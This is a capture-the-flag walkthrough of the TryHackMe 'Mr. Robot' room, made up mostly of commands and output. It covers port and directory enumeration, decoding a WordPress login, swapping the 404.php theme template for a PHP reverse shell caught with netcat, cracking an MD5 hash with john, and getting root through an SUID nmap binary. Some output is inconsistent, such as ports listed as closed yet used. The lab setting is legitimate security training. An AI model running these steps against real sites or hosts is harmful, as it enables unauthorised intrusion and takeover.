TryHackMe Mr. Robot Walkthrough

Let's begin by nmapping the server. 

```bash

sudo nmap -T4 -sV -A <server>

```

This outputs the following ports, services, and OS details. 

```bash

PORT    STATE   SERVICE   VERSION
22/tcp  closed  ssh
80/tcp  closed  http
443/tcp closed  https
Device type: general purpose|specialized
Running: Linux 2.6.X, VMware ESX Server 3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.11 cpe:/o:vmware:esx:3.0:2
OS details: Linux 2.6.11, Linux 2.6.18, Linux 2.6.39, VMware ESX Server 3.0.2
Network Distance: 4 hops

OS and Service detection performed. Pleaes report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP addess (1 host up) scanned in 23.99 seconds

```

We can see the standard http/https ports and SSH. 

Navigating to the webpage and inspecting the HTML gives a cool easter egg.

< 1. easter egg >

The actual contents of the web page are very minimal with a few commands that invoke videos, and other data. 

< 3. loading into webpage > 

Without wasting anytime, were going to enumerate the directories with gobuster using the command:

```bash

gobuster dir -u http://<server> -w /usr/share/wordlists/dirb/big.txt -x html

```
With that we are give the output of the following domains:

```bash

.htaccess.html        (Status: 403) [Size: 223]
.htaccess             (Status: 403) [Size: 218]
.htpasswd             (Status: 403) [Size: 218]
.htpasswd.html        (Status: 403) [Size: 223]
0                     (Status: 301) [Size: 0] [--> http://10.201.103.214/0/]
0000                  (Status: 301) [Size: 0] [--> http://10.201.103.214/0000/]
Image                 (Status: 301) [Size: 0] [--> http://10.201.103.214/Image/
admin                 (Status: 301) [Size: 236] [--> http://10.201.103.214/admin/]
atom                  (Status: 301) [Size: 235] [--> http://10.201.103.214/feed/atom]
audio                 (Status: 301) [Size: 222] [--> http://10.201.103.214/audio]
blog                  (Status: 301) [Size: 235] [--> http://10.201.103.214/blog/]
cig-bin/.html         (Status: 403) [Size: 222]
css                   (Status: 301) [Size: 234] [--> http://10.201.103.214/css/]
dashboard             (Status: 301) [Size: 0] [--> http://10.201.103.214/wp-admin/]
favicon.ico           (Status: 200) [Size: 0]
feed                  (Status: 301) [Size: 0] [--> http://10.201.103.214/feed/]

```

Second scan, with the notable results listed

```bash

/wp-content
/login
/robots

```
Let's navigate to /robots

```bash

<server>/robots.txt

```

Gives us our first key. 

< 6. navigating to key >

```bash

<server>/key-1-of-3.txt

```
Along with a very interesting list, which I assume to be passwords located in the sub-directory:

```bash

<server>/fsocity.dic

```

Run the command:

```bash

wget <server/fsocity.dic

```

Were going to need this later so keep it handy.

In the meantime lets navigate to:

```bash

<server>/license

```

this page was found while I was poking around

< 9. second flag >

It's encrypted with base64 so let's decrypt it using the command:

```bash

echo -n "<base64 encryption>" | base64 -d
elliot:ER28-0652

```
There is a SSH client on the server but it's not for that. 

Remember that word press domain that we saw earlier in the second scan that we did? These are the credentials for that. 

Let's navigate to:

```bash

<server>/wp-login

```

Entering Elliot's credentials gives us access to the wordpress dashboard. 

< 10. loggin into wp >

From previous CTF's i've done a reverse shell exploit on wordpress by replacing the template on 404.php with the malicious payload. 

I'm going to attempt the same thing assuming that its vulnerable.

The code that I am using is from http://pentestmonkey.net/

PHP Reverse Shell:

< 12. uploading reverses shell >

Upload the file and save it. 

Now we are going to set up our listener using netcat:

```bash

nc -nlvp 4444
Listening on 0.0.0.0 4444

```

Then we need to invoke the webpage, you can either visit the link or run curl: 

```bash

curl "http://<server>/wp-includes/themes/TwentyFifteen/404.php"

```

Immediately after we curl that page we should get an active terminal. Let's upgrade it:

Ctrl+Z - suspends the process

stty raw -echo ; fg - puts the terminal into raw mode, which fixed input issues, echo prevents double typing, and fg brings back reverse shell back to the foreground 

```

Now that were in we can poke around and see what we can find.

Under the user 'robot' there are two files

```bash

key-2-of-3.txt password.raw-md5

``` 

We can't view the key because we dont have the permissions to but, we can see that the hash used is insecure and can be broken. 


```bash

daemon@ip-10-201-59-91:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

```
Based on the previous format of the username and password that we found for Elliot, we can assume that the md5 hash is going to give us the password for the user 'robot'

We'll run john the ripper against it to extract the password, but were going to be using the wordlist that we saved earlier, fsocity.dic.

I saved it into a text file and named it wordlist.txt:

```bash

john --format=Raw-MD5 --wordllist=wordlist.txt hash.txt
Using default input encoding: UTF-8
Laded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost and other key for status
Warning: Only 1 candidate left, minimum 12 needed for performance.
abcdefghijklmnopqrstuvwxyz (?)
1g 0::00:00:00 DONE (2025-11-18) 100.0g/s 100.0p/s 100.0c/s abcdefghijklmnopqrstuvwxyz
Use the "--show --format=Raw-MD5" options to display all of the cracker password reliably
Session Completed

```

Above is the password that we needed to get into the user 'robot' and grab our second key. 

< 18. logging into robot account >

And below is the second flag 

< 3. second flag >

Now all we need to do is get the last flag. 

Running the command: 

```bash 

sudo -l

```

Is not allowed, so we need to find another way to determine what we have permissions to on this user.

Run the following command:

```bash

find / -perm -4000 -type f 2>/dev/null 

breakdown: 

find / --> start from the root directory 
-perm -4000 --> look for the SUID binaries
-type f --> files only
2>/dev/null --> hide permission-denied errors

```

Running that command gives us a list:

```bash

/bin/umount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbut-1.0-daemon-launch-helper

```

We can escalate our privileges and gain root access using this exploit: https://www.adamcouch.co.uk/linux-privilege-escalation-setuid-nmap/

To do this we run the following commands:

```bash

cd /usr/local/bin

nmap --interactive

nmap> !whoami
!whoami
root

cat /root/key-3-of-3.txt
<root flag>

```
<4. last flag>

Congratulations you have completed the room!


